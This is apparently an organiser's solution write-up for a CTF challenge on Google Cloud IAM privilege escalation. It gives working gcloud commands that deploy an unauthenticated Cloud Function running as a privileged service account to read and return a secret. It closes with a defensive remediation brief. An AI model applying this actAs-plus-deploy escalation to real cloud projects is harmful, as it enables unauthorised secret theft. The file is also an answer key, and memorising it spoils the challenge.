# h02 — Deploy Your Privilege (Ruhunu Bank)

**Category:** Cloud IAM / actAs privilege escalation · **Difficulty:** Insane · **Points:** 500 (dynamic)

## Intended solve
```sh
gcloud auth activate-service-account --key-file=deployer-sa-key.json
gcloud config set project <sandbox>

# The custom role on this SA looks harmless but bundles a lethal pair:
#   cloudfunctions.functions.create + cloudfunctions.functions.sourceCodeSet + iam.serviceAccounts.actAs
# on a PRIVILEGED runtime SA (ruhunu-core@) that can read the crown-jewels secret.
gcloud iam roles describe <customRole> --project <sandbox>          # confirm the perms

# You cannot read the secret directly. Instead DEPLOY code that RUNS AS the privileged SA:
cat > main.py <<'PY'
import functions_framework, google.auth, subprocess
@functions_framework.http
def f(request):
    return subprocess.check_output(
        ["gcloud","secrets","versions","access","latest","--secret=ruhunu-crownjewels"])
PY
gcloud functions deploy pwn --runtime python312 --trigger-http --allow-unauthenticated \
  --entry-point f --service-account ruhunu-core@<sandbox>.iam.gserviceaccount.com --source .
curl "$(gcloud functions describe pwn --format='value(url)')"      # runs as ruhunu-core -> CYPHER{...}
```
The escalation is **`actAs` + a deploy permission**: you never read the secret, you deploy a
workload that runs *as* the identity that can.

## Infra & safety
- Attached least-privilege `deployer-sa-key.json` (a custom role: functions create + `actAs` on
  exactly one runtime SA). `ruhunu-core` has only `secretAccessor` on the one secret.
- **Shared** challenge, **per-team unique flag**. Deployer cannot touch anything but this deploy
  path; runtime SA cannot exceed its one secret. IAM healthcheck asserts both scopes.

## Remediation (Blue Team Brief)
`iam.serviceAccounts.actAs` + any deploy/compute-create permission = privilege escalation to that
SA. Never bundle them in a role; separate deploy identity from runtime identity; least-privilege
runtime SAs; audit custom roles for the actAs+create combination.
